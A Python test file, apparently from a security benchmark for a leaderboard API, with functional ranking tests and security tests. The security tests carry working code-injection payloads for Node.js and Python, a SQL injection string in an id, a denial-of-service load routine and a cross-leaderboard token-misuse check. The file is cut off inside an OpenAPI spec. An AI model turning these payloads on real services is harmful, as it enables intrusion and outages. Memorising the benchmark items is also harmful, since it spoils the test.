# flake8: noqa
# isort: skip_file
import uuid

from exploits import (
    execute_sql_on_docker,
    load_file_from_docker,
    memory_usage,
    monitor_container_resources,
)

generate_marker = lambda: uuid.uuid4().hex
# import libraries
from typing import Any, Dict, List, Tuple

import requests

import cwes

# shared methods
from scenarios.base import AppInstance


def _base_url(app: AppInstance) -> str:
    return f"http://localhost:{app.port}"


def _is_2xx(status_code: int) -> bool:
    return 200 <= status_code < 300


def _post_leaderboard(
    app: AppInstance, competitors: List[Dict[str, Any]], name: str | None = None
) -> requests.Response:
    url = f"{_base_url(app)}/leaderboards"
    payload: Dict[str, Any] = {"competitors": competitors}
    if name is not None:
        payload["name"] = name
    return requests.post(url=url, json=payload)


def _put_formula(
    app: AppInstance, leaderboard_id: str, management_token: str, expression: str
) -> requests.Response:
    url = f"{_base_url(app)}/leaderboards/{leaderboard_id}/formula"
    headers = {"X-Management-Token": management_token}
    return requests.put(url=url, headers=headers, json={"expression": expression})


def _get_rankings(app: AppInstance, leaderboard_id: str) -> requests.Response:
    url = f"{_base_url(app)}/leaderboards/{leaderboard_id}/rankings"
    return requests.get(url=url)


def _approx_equal(a: float, b: float, tol: float = 1e-6) -> bool:
    return abs(float(a) - float(b)) <= tol


def _validate_rankings_payload(
    app: AppInstance,
    data: Any,
    expected: List[Tuple[str, float]],
) -> bool:
    """
    expected: list of tuples (competitorId, expectedScore) in expected order (descending by score)
    Validates:
      - Response is a list
      - Length equals expected
      - For each entry i:
          - has required fields: rank, competitorId, computedScore
          - rank == i+1
          - competitorId matches expected[i][0]
          - computedScore approximately equals expected[i][1]
    """
    if not isinstance(data, list):
        app.logger.warning("Rankings payload is not a list: %r", data)
        return False

    if len(data) != len(expected):
        app.logger.warning(
            "Unexpected rankings length: got %d, expected %d. Payload: %r",
            len(data),
            len(expected),
            data,
        )
        return False

    for idx, (exp_competitor, exp_score) in enumerate(expected, start=1):
        entry = data[idx - 1]
        if not isinstance(entry, dict):
            app.logger.warning(
                "Ranking entry is not an object at index %d: %r", idx - 1, entry
            )
            return False
        # Required fields
        for field in ["rank", "competitorId", "computedScore"]:
            if field not in entry:
                app.logger.warning(
                    "Ranking entry missing required field '%s': %r", field, entry
                )
                return False

        if entry["rank"] != idx:
            app.logger.warning(
                "Unexpected rank at index %d: got %r expected %r",
                idx - 1,
                entry["rank"],
                idx,
            )
            return False

        if entry["competitorId"] != exp_competitor:
            app.logger.warning(
                "Unexpected competitorId at rank %d: got %r expected %r",
                idx,
                entry["competitorId"],
                exp_competitor,
            )
            return False

        if not _approx_equal(entry["computedScore"], exp_score):
            app.logger.warning(
                "Unexpected computedScore for competitor %s at rank %d: got %r expected %r",
                exp_competitor,
                idx,
                entry["computedScore"],
                exp_score,
            )
            return False

    return True


# import other libraries
# additional helper code not given already
import math

# import other libraries
import threading
import time
from json import JSONDecodeError
from statistics import mean

# import other libraries
# additional helper code not given already
# import other libraries
# additional helper code not given already
from typing import Any, Dict, List, Optional, Set, Tuple

import requests

# import other libraries
# additional helper code not given already


def func_test_create_set_formula_and_fetch_rankings_basic_arithmetic(
    app: AppInstance,
) -> bool:
    # Step 1: Create leaderboard
    competitors = [
        {
            "competitorId": "driver_33",
            "displayName": "Max Verstappen",
            "stats": {"wins": 10, "poles": 8},
        },
        {
            "competitorId": "driver_44",
            "displayName": "Lewis Hamilton",
            "stats": {"wins": 8, "poles": 7},
        },
    ]
    resp_create = _post_leaderboard(app, competitors)
    if not _is_2xx(resp_create.status_code):
        app.logger.warning(
            "POST /leaderboards not 2xx: %d %s | Body: %s",
            resp_create.status_code,
            resp_create.reason,
            resp_create.text,
        )
        return False

    body = resp_create.json()
    for field in ["leaderboardId", "managementToken", "formulaDefined"]:
        if field not in body:
            app.logger.warning("Create response missing field '%s': %r", field, body)
            return False

    leaderboard_id = body["leaderboardId"]
    management_token = body["managementToken"]

    # Step 2: Set formula
    resp_formula = _put_formula(
        app, leaderboard_id, management_token, "2*wins + 3*poles"
    )
    if not _is_2xx(resp_formula.status_code):
        app.logger.warning(
            "PUT /leaderboards/%s/formula not 2xx: %d %s | Body: %s",
            leaderboard_id,
            resp_formula.status_code,
            resp_formula.reason,
            resp_formula.text,
        )
        return False

    # Step 3: Get rankings
    resp_rankings = _get_rankings(app, leaderboard_id)
    if not _is_2xx(resp_rankings.status_code):
        app.logger.warning(
            "GET /leaderboards/%s/rankings not 2xx: %d %s | Body: %s",
            leaderboard_id,
            resp_rankings.status_code,
            resp_rankings.reason,
            resp_rankings.text,
        )
        return False

    data = resp_rankings.json()
    expected = [
        ("driver_33", 44.0),  # 2*10 + 3*8
        ("driver_44", 37.0),  # 2*8 + 3*7
    ]
    if not _validate_rankings_payload(app, data, expected):
        return False

    return True


def func_test_formula_with_functions_max_and_ordering(app: AppInstance) -> bool:
    # Step 1: Create leaderboard
    competitors = [
        {"competitorId": "a", "stats": {"wins": 5, "penalties": 4, "bonus": -3}},
        {"competitorId": "b", "stats": {"wins": 4, "penalties": 0, "bonus": 5}},
        {"competitorId": "c", "stats": {"wins": 6, "penalties": 20, "bonus": 1}},
    ]
    resp_create = _post_leaderboard(app, competitors)
    if not _is_2xx(resp_create.status_code):
        app.logger.warning(
            "POST /leaderboards not 2xx: %d %s | Body: %s",
            resp_create.status_code,
            resp_create.reason,
            resp_create.text,
        )
        return False

    body = resp_create.json()
    if "leaderboardId" not in body or "managementToken" not in body:
        app.logger.warning("Create response missing required fields: %r", body)
        return False

    leaderboard_id = body["leaderboardId"]
    management_token = body["managementToken"]

    # Step 2: Set formula with functions
    expression = "2*wins + max(0, bonus) - 0.5*penalties"
    resp_formula = _put_formula(app, leaderboard_id, management_token, expression)
    if not _is_2xx(resp_formula.status_code):
        app.logger.warning(
            "PUT /leaderboards/%s/formula not 2xx: %d %s | Body: %s",
            leaderboard_id,
            resp_formula.status_code,
            resp_formula.reason,
            resp_formula.text,
        )
        return False

    # Step 3: Get rankings
    resp_rankings = _get_rankings(app, leaderboard_id)
    if not _is_2xx(resp_rankings.status_code):
        app.logger.warning(
            "GET /leaderboards/%s/rankings not 2xx: %d %s | Body: %s",
            leaderboard_id,
            resp_rankings.status_code,
            resp_rankings.reason,
            resp_rankings.text,
        )
        return False

    data = resp_rankings.json()
    expected = [
        ("b", 13.0),  # 2*4 + 5 - 0
        ("a", 8.0),  # 2*5 + 0 - 2
        ("c", 3.0),  # 2*6 + 1 - 10
    ]
    if not _validate_rankings_payload(app, data, expected):
        return False

    return True


def func_test_updating_formula_reorders_leaderboard(app: AppInstance) -> bool:
    # Step 1: Create leaderboard
    competitors = [
        {"competitorId": "c1", "stats": {"wins": 3, "penalties": 2}},
        {"competitorId": "c2", "stats": {"wins": 2, "penalties": 0}},
        {"competitorId": "c3", "stats": {"wins": 1, "penalties": 5}},
    ]
    resp_create = _post_leaderboard(app, competitors)
    if not _is_2xx(resp_create.status_code):
        app.logger.warning(
            "POST /leaderboards not 2xx: %d %s | Body: %s",
            resp_create.status_code,
            resp_create.reason,
            resp_create.text,
        )
        return False

    body = resp_create.json()
    for field in ["leaderboardId", "managementToken"]:
        if field not in body:
            app.logger.warning("Create response missing field '%s': %r", field, body)
            return False

    leaderboard_id = body["leaderboardId"]
    management_token = body["managementToken"]

    # Step 2: Set initial formula "wins"
    resp_formula_1 = _put_formula(app, leaderboard_id, management_token, "wins")
    if not _is_2xx(resp_formula_1.status_code):
        app.logger.warning(
            "PUT /leaderboards/%s/formula (wins) not 2xx: %d %s | Body: %s",
            leaderboard_id,
            resp_formula_1.status_code,
            resp_formula_1.reason,
            resp_formula_1.text,
        )
        return False

    # Step 3: Get rankings for "wins"
    resp_rankings_1 = _get_rankings(app, leaderboard_id)
    if not _is_2xx(resp_rankings_1.status_code):
        app.logger.warning(
            "GET /leaderboards/%s/rankings not 2xx: %d %s | Body: %s",
            leaderboard_id,
            resp_rankings_1.status_code,
            resp_rankings_1.reason,
            resp_rankings_1.text,
        )
        return False
    expected_1 = [
        ("c1", 3.0),
        ("c2", 2.0),
        ("c3", 1.0),
    ]
    if not _validate_rankings_payload(app, resp_rankings_1.json(), expected_1):
        return False

    # Step 4: Update formula to "wins - penalties"
    resp_formula_2 = _put_formula(
        app, leaderboard_id, management_token, "wins - penalties"
    )
    if not _is_2xx(resp_formula_2.status_code):
        app.logger.warning(
            "PUT /leaderboards/%s/formula (wins - penalties) not 2xx: %d %s | Body: %s",
            leaderboard_id,
            resp_formula_2.status_code,
            resp_formula_2.reason,
            resp_formula_2.text,
        )
        return False

    # Step 5: Get rankings after update
    resp_rankings_2 = _get_rankings(app, leaderboard_id)
    if not _is_2xx(resp_rankings_2.status_code):
        app.logger.warning(
            "GET /leaderboards/%s/rankings not 2xx after update: %d %s | Body: %s",
            leaderboard_id,
            resp_rankings_2.status_code,
            resp_rankings_2.reason,
            resp_rankings_2.text,
        )
        return False
    expected_2 = [
        ("c2", 2.0),  # 2 - 0
        ("c1", 1.0),  # 3 - 2
        ("c3", -4.0),  # 1 - 5
    ]
    if not _validate_rankings_payload(app, resp_rankings_2.json(), expected_2):
        return False

    return True


def sec_test_code_injection(app: AppInstance) -> set[cwes.CWE] | None:
    """
    Attempts to exploit CWE-94 by injecting a code-evaluated scoring expression that writes a unique marker
    to the server filesystem during ranking computation. Returns {cwes.CWE.CODE_INJECTION} on success, else set().
    """
    findings: set[cwes.CWE] = set()

    try:
        app.logger.info("CWE-94 test: starting setup (creating minimal leaderboard).")

        # Create a minimal leaderboard with one competitor and a simple stat
        competitors = [
            {"competitorId": "poc", "displayName": "PoC", "stats": {"wins": 1}}
        ]
        create_resp = _post_leaderboard(app, competitors, name="Code Injection PoC")
        app.logger.info("POST /leaderboards -> status=%d", create_resp.status_code)
        if create_resp.status_code != 201:
            app.logger.warning(
                "Failed to create leaderboard (expected 201). Aborting CWE-94 test."
            )
            return findings

        created = create_resp.json()
        leaderboard_id = created.get("leaderboardId")
        management_token = created.get("managementToken")
        if not leaderboard_id or not management_token:
            app.logger.warning(
                "Missing leaderboardId or managementToken in creation response: %r",
                created,
            )
            return findings

        # Prepare unique marker and target file path (do not log/print the marker)
        marker = generate_marker()
        file_path = f"/tmp/POC_{marker}"

        # Candidate payloads: attempt Node.js variants first, then Python
        # Each tuple: (label, expression, expected_score)
        payloads: list[Tuple[str, str, float]] = [
            (
                "node_mainModule",
                f"process.mainModule.require('fs').writeFileSync('{file_path}','{marker}'), 0",
                0.0,
            ),
            (
                "node_global_or_process",
                f"(global.process || process).mainModule.require('fs').writeFileSync('{file_path}','{marker}'), 0",
                0.0,
            ),
            (
                "python_builtins_open_write",
                f"__import__('builtins').open('{file_path}','w').write('{marker}')",
                float(len(marker)),
            ),
        ]

        def try_payload(label: str, expression: str, expected_score: float) -> bool:
            app.logger.info("Attempting formula injection payload: %s", label)

            put_resp = _put_formula(app, leaderboard_id, management_token, expression)
            app.logger.info(
                "PUT /leaderboards/%s/formula -> status=%d",
                leaderboard_id,
                put_resp.status_code,
            )
            if not _is_2xx(put_resp.status_code):
                app.logger.warning(
                    "Formula update rejected for payload '%s' (status=%d).",
                    label,
                    put_resp.status_code,
                )
                return False

            # Trigger evaluation by fetching rankings
            get_resp = _get_rankings(app, leaderboard_id)
            app.logger.info(
                "GET /leaderboards/%s/rankings -> status=%d",
                leaderboard_id,
                get_resp.status_code,
            )
            if not _is_2xx(get_resp.status_code):
                app.logger.warning(
                    "Rankings fetch failed after setting payload '%s' (status=%d).",
                    label,
                    get_resp.status_code,
                )
                # Even if rankings failed, still attempt to check the file side-effect
                # because evaluation might have been attempted before error.
            else:
                try:
                    data = get_resp.json()
                except Exception as ex:
                    app.logger.warning("Failed to parse rankings JSON: %r", ex)
                    data = None

                if data is not None:
                    expected = [("poc", expected_score)]
                    valid = _validate_rankings_payload(app, data, expected)
                    if not valid:
                        app.logger.warning(
                            "Rankings payload validation did not match expectation for '%s'.",
                            label,
                        )
                    else:
                        app.logger.info(
                            "Rankings payload validated (computedScore matched expectation) for '%s'.",
                            label,
                        )

            # Verify server-side side effect (presence and content of the marker file)
            try:
                content = load_file_from_docker(app.container_id, file_path)
                if isinstance(content, (bytes, bytearray)):
                    try:
                        content_str = content.decode("utf-8", errors="ignore")
                    except Exception:
                        content_str = ""
                else:
                    content_str = str(content)

                if content_str == marker:
                    app.logger.info(
                        "CWE-94 exploit succeeded via payload '%s': server-side file side-effect verified.",
                        label,
                    )
                    return True
                else:
                    app.logger.debug(
                        "Side-effect file content mismatch or empty for payload '%s'.",
                        label,
                    )
            except Exception as ex:
                app.logger.debug(
                    "Could not load side-effect file for payload '%s': %r", label, ex
                )

            return False

        for label, expr, expected in payloads:
            if try_payload(label, expr, expected):
                findings.add(cwes.CWE.CODE_INJECTION)
                break

        if not findings:
            app.logger.info("CWE-94 test did not succeed with available payloads.")

        return findings

    except Exception as e:
        app.logger.exception("Unexpected error during CWE-94 test: %r", e)
        return findings


def sec_test_sql_injection(app: AppInstance) -> set[cwes.CWE] | None:
    vulns: set[cwes.CWE] = set()
    try:
        app.logger.info(
            "Starting fixed SQL Injection test targeting rankings path parameter"
        )

        # 1) Create a normal leaderboard via API to populate competitors table
        competitors = [
            {
                "competitorId": "c1",
                "displayName": "Alpha",
                "stats": {"wins": 3, "poles": 1},
            },
            {
                "competitorId": "c2",
                "displayName": "Bravo",
                "stats": {"wins": 1, "poles": 2},
            },
        ]
        resp_create = _post_leaderboard(app, competitors, name="SQLi Control LB")
        if resp_create.status_code != 201:
            app.logger.warning(
                "Failed to create control leaderboard: %s %r",
                resp_create.status_code,
                resp_create.text,
            )
            return set()
        created = resp_create.json()
        control_lb_id = created.get("leaderboardId")
        control_mgmt_token = created.get("managementToken")
        if not control_lb_id or not control_mgmt_token:
            app.logger.warning("Creation response missing fields: %r", created)
            return set()

        # Define any formula for the control leaderboard (not strictly necessary for the exploit)
        _put_formula(app, control_lb_id, control_mgmt_token, "wins + 2*poles")

        # 2) Seed DB with a malicious leaderboard id that contains an injected predicate
        #    This is needed because the endpoint first performs a parameterized lookup on leaderboardId.
        from uuid import uuid4
        from urllib.parse import quote

        marker_hex = generate_marker()  # do not log or print this marker
        try:
            marker_num = int(marker_hex[:8], 16)
        except Exception:
            marker_num = 42424242  # deterministic fallback

        inj_suffix = "' OR '1'='1' -- "
        malicious_id_plain = f"lb_{uuid4().hex[:8]}{inj_suffix}"
        malicious_name = "Injected LB"
        # Constant expression is fine; avoids needing any specific stats
        malicious_formula = str(float(marker_num))

        # Prepare SQL literals (escape single quotes)
        def sql_literal(s: str) -> str:
            return s.replace("'", "''")

        db_path = f"{app.env.workdir}/db.sqlite3"

        # Insert malicious leaderboard
        sql_insert_lb = (
            "INSERT INTO leaderboards (id, name, management_token_hash, formula) "
            f"VALUES ('{sql_literal(malicious_id_plain)}', '{sql_literal(malicious_name)}', 'deadbeef', '{sql_literal(malicious_formula)}');"
        )
        res_lb = execute_sql_on_docker(app.container_id, db_path, sql_insert_lb)
        # Insert one competitor for the malicious leaderboard
        mal_comp_pk = f"comp_{uuid4().hex}"
        mal_comp_competitor_id = "evil_1"
        mal_comp_display_name = "Evil One"
        mal_stats_repr = "{'wins': 0, 'poles': 0}"  # Python-literal style to satisfy eval(row[2]) in app
        sql_insert_comp = (
            "INSERT INTO competitors (id, leaderboard_id, competitor_id, display_name, stats) "
            f"VALUES ('{sql_literal(mal_comp_pk)}', '{sql_literal(malicious_id_plain)}', "
            f"'{sql_literal(mal_comp_competitor_id)}', '{sql_literal(mal_comp_display_name)}', "
            f"'{sql_literal(mal_stats_repr)}');"
        )
        res_comp = execute_sql_on_docker(app.container_id, db_path, sql_insert_comp)

        # 3) Trigger the vulnerable endpoint using the injected leaderboard id
        inj_id_encoded = quote(malicious_id_plain, safe="")
        resp_rank = _get_rankings(app, inj_id_encoded)
        app.logger.info("Rankings response status: %s", resp_rank.status_code)
        if resp_rank.status_code != 200:
            app.logger.warning(
                "Failed to fetch rankings with injected id. Body: %r", resp_rank.text
            )
            return set()

        rankings = resp_rank.json()
        if not isinstance(rankings, list):
            app.logger.warning("Rankings payload not a list: %r", rankings)
            return set()

        # We inserted 1 competitor under the malicious id, but expect more due to WHERE clause expansion
        if len(rankings) <= 1:
            app.logger.warning(
                "SQLi effect not observed: expected more than 1 entry, got %d. Payload: %r",
                len(rankings),
                rankings,
            )
            return set()

        # Optionally, verify the constant formula impact: all computed scores ≈ marker_num
        all_constant = True
        for entry in rankings:
            if not isinstance(entry, dict) or "computedScore" not in entry:
                all_constant = False
                break
            if not _approx_equal(entry["computedScore"], float(marker_num)):
                all_constant = False
                break

        if not all_constant:
            app.logger.warning(
                "Computed scores did not reflect constant injected formula across entries."
            )
            return set()

        app.logger.info(
            "SQL Injection confirmed via rankings path parameter: unauthorized row expansion and formula effect observed."
        )
        vulns.add(cwes.CWE.SQL_INJECTION)
        return vulns

    except Exception as e:
        app.logger.exception("Error during SQLi test: %s", e)
        return set()


def sec_test_uncontrolled_resource_consumption(
    app: AppInstance,
) -> set[cwes.CWE] | None:
    """
    Educational PoC for CWE-400 (Uncontrolled Resource Consumption) against FormulaRankLeaderboard.
    Strategy:
      - Create a large leaderboard with many competitors and multiple stats.
      - Install a very long but valid scoring expression that requires many function evaluations.
      - Hammer the unprotected rankings endpoint concurrently to induce heavy evaluation and memory usage.
      - Verify impact via resource monitoring and observable latency/errors.
    """
    base_url = f"http://localhost:{app.port}"
    marker = generate_marker()

    def log_resp(resp: Optional[requests.Response], label: str) -> None:
        if resp is None:
            app.logger.error("%s: No response (likely timeout/exception)", label)
            return
        try:
            body = (
                resp.json()
                if resp.headers.get("Content-Type", "").startswith("application/json")
                else resp.text[:256]
            )
        except Exception:
            body = "<non-JSON>"
        app.logger.info(
            "%s: status=%s len=%s",
            label,
            getattr(resp, "status_code", None),
            len(str(body)),
        )

    # Helper: create competitors payload
    def build_competitors(n: int, stats_count: int = 16) -> List[Dict[str, Any]]:
        comps: List[Dict[str, Any]] = []
        for i in range(n):
            stats = {f"s{j}": float((i + j) % 5 + 1) for j in range(1, stats_count + 1)}
            comps.append(
                {
                    "competitorId": f"c{i:06d}",
                    # omit displayName to minimize payload size
                    "stats": stats,
                }
            )
        return comps

    # Helper: build costly expression string of repeated base term
    def build_expression(repetitions: int) -> str:
        T = (
            "sqrt(abs(min(max(s1+s2, s3+s4), max(s5+s6, s7+s8)))) + "
            "sqrt(abs(min(max(s9+s10, s11+s12), max(s13+s14, s15+s16))))"
        )
        # Chain the term with plus signs; valid, deterministic, heavy but compliant
        return " + ".join([T] * repetitions)

    # Baseline memory
    try:
        baseline_mem = memory_usage(app.container_id)
    except Exception as e:
        app.logger.warning("Failed to read baseline memory usage: %s", e)
        baseline_mem = 0
    app.logger.info("Baseline container memory usage: %s bytes", baseline_mem)

    # 1) Create a leaderboard with many competitors
    leaderboard_id: Optional[str] = None
    management_token: Optional[str] = None

    # Try a descending set of sizes until one works
    target_sizes = [8192, 4096, 2048, 1024]
    create_resp: Optional[requests.Response] = None
    for size in target_sizes:
        competitors = build_competitors(size)
        app.logger.info("Attempting to create leaderboard with %d competitors", size)
        try:
            create_resp = requests.post(
                url=f"{base_url}/leaderboards",
                json={"name": marker, "competitors": competitors},
                timeout=90,
            )
        except Exception as e:
            app.logger.warning("Create request failed for size %d: %s", size, e)
            continue

        log_resp(create_resp, f"POST /leaderboards (size={size})")
        if create_resp.status_code == 201:
            try:
                payload = create_resp.json()
                leaderboard_id = payload.get("leaderboardId")
                management_token = payload.get("managementToken")
                if leaderboard_id and management_token:
                    app.logger.info(
                        "Created leaderboardId=%s (size=%d); managementToken obtained.",
                        leaderboard_id,
                        size,
                    )
                    break
            except Exception as e:
                app.logger.warning("Failed to parse create response JSON: %s", e)
        else:
            app.logger.warning(
                "Create failed for size %d with status %s",
                size,
                create_resp.status_code,
            )

    if not leaderboard_id or not management_token:
        app.logger.error("Failed to create leaderboard; aborting PoC.")
        return set()

    # 2) Set an expensive formula
    # Try decreasing repetition counts until accepted
    repetition_plan = [1024, 768, 512, 256, 128, 64]
    put_resp: Optional[requests.Response] = None
    used_reps: Optional[int] = None
    for reps in repetition_plan:
        expr = build_expression(reps)
        app.logger.info(
            "Attempting to set formula with %d repetitions (expr length ~%d)",
            reps,
            len(expr),
        )
        try:
            put_resp = requests.put(
                url=f"{base_url}/leaderboards/{leaderboard_id}/formula",
                headers={"X-Management-Token": management_token},
                json={"expression": expr},
                timeout=90,
            )
        except Exception as e:
            app.logger.warning("PUT /formula failed for reps=%d: %s", reps, e)
            continue

        log_resp(put_resp, f"PUT /leaderboards/{leaderboard_id}/formula (reps={reps})")
        if _is_2xx(put_resp.status_code):
            used_reps = reps
            app.logger.info("Accepted costly expression with %d repetitions.", reps)
            break
        else:
            app.logger.warning(
                "Formula rejected for reps=%d with status %s",
                reps,
                put_resp.status_code,
            )

    if used_reps is None:
        app.logger.error("Failed to set any acceptable costly formula; aborting PoC.")
        return set()

    # 3) Trigger heavy computation via concurrent GET /rankings
    # Worker to continuously request rankings
    stop_event = threading.Event()
    latencies_lock = threading.Lock()
    latencies: List[float] = []
    errors: List[str] = []

    def rankings_worker(tid: int) -> None:
        url = f"{base_url}/leaderboards/{leaderboard_id}/rankings"
        local_count = 0
        while not stop_event.is_set():
            t0 = time.perf_counter()
            try:
                resp = requests.get(url=url, timeout=60)
                elapsed = time.perf_counter() - t0
                with latencies_lock:
                    latencies.append(elapsed)
                if resp.status_code != 200:
                    with latencies_lock:
                        errors.append(f"{tid}:{resp.status_code}")
                    app.logger.warning(
                        "Worker %d: non-200 status=%s (elapsed=%.2fs)",
                        tid,
                        resp.status_code,
                        elapsed,
                    )
                else:
                    # Only log sparingly to avoid overhead
                    if local_count % 3 == 0:
                        app.logger.info(
                            "Worker %d: rankings 200 in %.2fs", tid, elapsed
                        )
            except Exception as e:
                elapsed = time.perf_counter() - t0
                with latencies_lock:
                    errors.append(f"{tid}:exc:{e}")
                app.logger.warning(
                    "Worker %d: exception after %.2fs: %s", tid, elapsed, e
                )
            local_count += 1
            # Small pause to avoid client-side thrash; server load remains high due to concurrency
            time.sleep(0.05)

    # Start a set of workers
    concurrency = 8
    threads: List[threading.Thread] = []
    app.logger.info("Starting %d concurrent GET /rankings workers", concurrency)
    for i in range(concurrency):
        th = threading.Thread(target=rankings_worker, args=(i,), daemon=True)
        threads.append(th)
        th.start()

    # Monitor resources while the workers run
    monitor_duration = 45
    mem_threshold = max(
        baseline_mem + 150 * 1024 * 1024, 150 * 1024 * 1024
    )  # baseline + 150MB (absolute fallback)
    app.logger.info(
        "Monitoring resources for %ds with memory threshold=%d bytes",
        monitor_duration,
        mem_threshold,
    )
    exceeded = False
    try:
        exceeded = monitor_container_resources(
            app.container_id,
            duration=monitor_duration,
            logger=app.logger,
            memory_usage_threshold=mem_threshold,
            storage_usage_threshold=10
            * 1024
            * 1024
            * 1024,  # high storage threshold; focus on memory
        )
    except Exception as e:
        app.logger.warning("monitor_container_resources failed: %s", e)

    # Stop workers and gather stats
    stop_event.set()
    for th in threads:
        th.join(timeout=5)

    # Post-attack memory reading
    try:
        post_mem = memory_usage(app.container_id)
    except Exception as e:
        app.logger.warning("Failed to read post-attack memory usage: %s", e)
        post_mem = baseline_mem

    with latencies_lock:
        avg_latency = mean(latencies) if latencies else 0.0
        max_latency = max(latencies) if latencies else 0.0
        err_count = len(errors)

    app.logger.info(
        "Attack summary: %d requests, %d errors, avg latency=%.2fs, max latency=%.2fs, baseline_mem=%d, post_mem=%d, exceeded=%s",
        len(latencies),
        err_count,
        avg_latency,
        max_latency,
        baseline_mem,
        post_mem,
        exceeded,
    )

    # Determine success
    mem_delta = post_mem - baseline_mem
    app.logger.info("Observed memory delta: %+d bytes", mem_delta)

    # Success criteria: resource monitor exceeded threshold OR large memory delta OR many server errors OR high latency
    success = False
    if exceeded:
        app.logger.info("Success: monitor detected memory threshold exceeded.")
        success = True
    elif mem_delta >= 100 * 1024 * 1024:
        app.logger.info("Success: memory increased by >=100MB (%d bytes).", mem_delta)
        success = True
    elif err_count >= 3:
        app.logger.info(
            "Success: observed %d server errors/timeouts during load.", err_count
        )
        success = True
    elif avg_latency >= 3.0 or max_latency >= 10.0:
        app.logger.info(
            "Success: high response latency observed (avg >= 3s or max >= 10s)."
        )
        success = True

    if success:
        return {cwes.CWE.UNCONTROLLED_RESOURCE_CONSUMPTION}
    return set()


def sec_test_improper_access_control(app: AppInstance) -> set[cwes.CWE] | None:
    findings: set[cwes.CWE] = set()
    try:
        app.logger.info(
            "Starting CWE-284 (Improper Access Control) test for FormulaRankLeaderboard"
        )

        # Step 1: Create attacker-owned leaderboard to obtain a valid management token
        attacker_competitors = [{"competitorId": "att_1", "stats": {"wins": 1}}]
        r_att = _post_leaderboard(app, attacker_competitors, name="attacker_board")
        if r_att.status_code != 201:
            app.logger.warning(
                "Failed to create attacker leaderboard: HTTP %d, body=%r",
                r_att.status_code,
                r_att.text,
            )
            return findings

        try:
            att_data = r_att.json()
        except JSONDecodeError:
            app.logger.warning(
                "Attacker leaderboard creation did not return valid JSON. Body=%r",
                r_att.text,
            )
            return findings

        attacker_leaderboard_id = att_data.get("leaderboardId")
        attacker_mgmt_token = att_data.get("managementToken")
        if not attacker_leaderboard_id or not attacker_mgmt_token:
            app.logger.warning(
                "Attacker leaderboard response missing required fields: %r", att_data
            )
            return findings
        app.logger.info("Created attacker leaderboard: id obtained and token issued.")

        # Step 2: Create a second (victim) leaderboard; we will not use its token
        victim_competitors = [{"competitorId": "vic_1", "stats": {"wins": 2}}]
        r_vic = _post_leaderboard(app, victim_competitors, name="victim_board")
        if r_vic.status_code != 201:
            app.logger.warning(
                "Failed to create victim leaderboard: HTTP %d, body=%r",
                r_vic.status_code,
                r_vic.text,
            )
            return findings

        try:
            vic_data = r_vic.json()
        except JSONDecodeError:
            app.logger.warning(
                "Victim leaderboard creation did not return valid JSON. Body=%r",
                r_vic.text,
            )
            return findings

        victim_leaderboard_id = vic_data.get("leaderboardId")
        if not victim_leaderboard_id:
            app.logger.warning(
                "Victim leaderboard response missing leaderboardId: %r", vic_data
            )
            return findings
        app.logger.info(
            "Created victim leaderboard: id obtained (token intentionally not retained)."
        )

        # Step 3: Build a constant-expression payload that references a stat (to satisfy validators)
        # Use a unique marker-derived numeric constant M, but do not log or print its value.
        marker = generate_marker()
        # Derive a bounded float from marker without exposing marker in logs
        seed = int(marker[:8], 16)
        M = round(float(seed % 100000) + 0.321, 3)  # bounded, deterministic from marker
        expression = f"0*wins + {M}"

        # Step 4: Attempt unauthorized formula update on the victim using the attacker's token
        r_put = _put_formula(
            app, victim_leaderboard_id, attacker_mgmt_token, expression
        )
        if not _is_2xx(r_put.status_code):
            app.logger.info(
                "Cross-leaderboard PUT rejected (expected if properly scoped). HTTP %d, body=%r",
                r_put.status_code,
                r_put.text,
            )
            return findings

        app.logger.info(
            "Cross-leaderboard PUT accepted (potential improper access control)."
        )

        # Optional control: try a random bogus token to ensure some token validation exists (do not block success)
        bogus_token = "bogus_" + generate_marker()
        r_put_bogus = _put_formula(app, victim_leaderboard_id, bogus_token, expression)
        if r_put_bogus.status_code == 403:
            app.logger.info(
                "Control check: bogus token rejected with 403 (service validates token presence/format)."
            )
        else:
            app.logger.info(
                "Control check: bogus token not rejected with 403 (HTTP %d). This may indicate broader auth issues.",
                r_put_bogus.status_code,
            )

        # Step 5: Fetch victim rankings and verify computed score equals the constant M for the victim competitor
        r_rank = _get_rankings(app, victim_leaderboard_id)
        if r_rank.status_code != 200:
            app.logger.warning(
                "Failed to fetch victim rankings after formula update: HTTP %d, body=%r",
                r_rank.status_code,
                r_rank.text,
            )
            return findings

        try:
            rank_data = r_rank.json()
        except JSONDecodeError:
            app.logger.warning(
                "Rankings response is not valid JSON. Body=%r", r_rank.text
            )
            return findings

        # Minimal validation without revealing marker-derived value
        if (
            not isinstance(rank_data, list)
            or len(rank_data) != 1
            or not isinstance(rank_data[0], dict)
        ):
            app.logger.warning("Unexpected rankings payload structure: %r", rank_data)
            return findings

        entry = rank_data[0]
        required_fields = ["rank", "competitorId", "computedScore"]
        if not all(field in entry for field in required_fields):
            app.logger.warning("Ranking entry missing required fields: %r", entry)
            return findings

        if entry["competitorId"] != "vic_1":
            app.logger.warning(
                "Unexpected competitorId in rankings: %r", entry.get("competitorId")
            )
            return findings

        # Check computedScore approximately equals M without logging the actual expected value
        got_score = float(entry["computedScore"])
        if abs(got_score - M) > 1e-6:
            app.logger.warning(
                "Computed score on victim leaderboard does not match the set formula constant."
            )
            return findings

        # If we reached here, we successfully updated the victim's formula using a token from another leaderboard
        app.logger.info(
            "Exploit successful: unauthorized cross-leaderboard formula update confirmed."
        )
        findings.add(cwes.CWE.IMPROPER_ACCESS_CONTROL)
        return findings

    except Exception as ex:
        app.logger.exception("Exception during CWE-284 test: %s", ex)
        return findings


_API_SPEC = """
openapi: 3.0.3
info:
  title: FormulaRankLeaderboard
  description: Backend to create leaderboards with competitors and numeric stats, define a scoring expression, and fetch rankings sorted by computed score.
  version: 1.0.0
paths:
  /leaderboards:
    post:
      summary: Create a leaderboard with competitors and their stats
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/CreateLeaderboardRequest'
      responses:
        '201':
          description: Leaderboard created
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/CreateLeaderboardResponse'
        '400':
          description: Invalid input
        '422':
          description: Malformed request
  /leaderboards/{leaderboardId}/formula:
    put:
      summary: Define or update the scoring expression for a leaderboard
      parameters:
        - $ref: '#/components/parameters/LeaderboardId'
        - $ref: '#/components/parameters/ManagementToken'
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/UpdateFormulaRequest'
      responses:
        '200':
          description: Scoring formula updated
        '400':
